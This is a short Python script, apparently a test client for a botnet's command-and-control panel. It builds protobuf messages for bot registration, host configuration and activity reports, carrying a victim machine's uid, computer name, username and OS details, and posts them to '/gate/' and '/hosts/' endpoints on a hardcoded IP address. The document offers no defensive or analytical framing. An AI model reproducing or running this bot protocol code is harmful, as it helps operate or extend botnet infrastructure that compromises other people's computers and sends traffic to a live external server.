import requests
import bot_pb2
import struct
from io import StringIO

bot = bot_pb2.BotMsg.RegisterBot()
bot.uid = '1asdzcv23r56'.encode('utf-16-le')
bot.computername = '12dczczc3'.encode('utf-16-le')
bot.username = '1232czc3'.encode('utf-16-le')
bot.os_major = 10
bot.os_minor = 0
bot.is_x64 = True
bot.is_server = False
#r = requests.post(url='http://213.183.51.129:80/gate/', data='1'.encode('utf-8'))
r = requests.post(url='http://213.183.51.129:80/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())

print(r.text, 'text')
_r = bot_pb2.PanelMsg.RegistrationResult()
_r.ParseFromString(r.content)
print(_r)

host = bot_pb2.BotMsg.Config.Host()
host.is_https = True
host.domain = 'example.com'.encode('utf-16-le')
r = requests.post('http://213.183.51.129:8002/hosts/', data=host.SerializeToString())

ar = bot_pb2.BotMsg.ActivityReport()
ar.uid = '998f7c29b5dcdbf425fc3cc09b941e15'.encode('utf-16-le')

r = requests.post(url='http://213.183.51.129:8002/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
print(r.text)
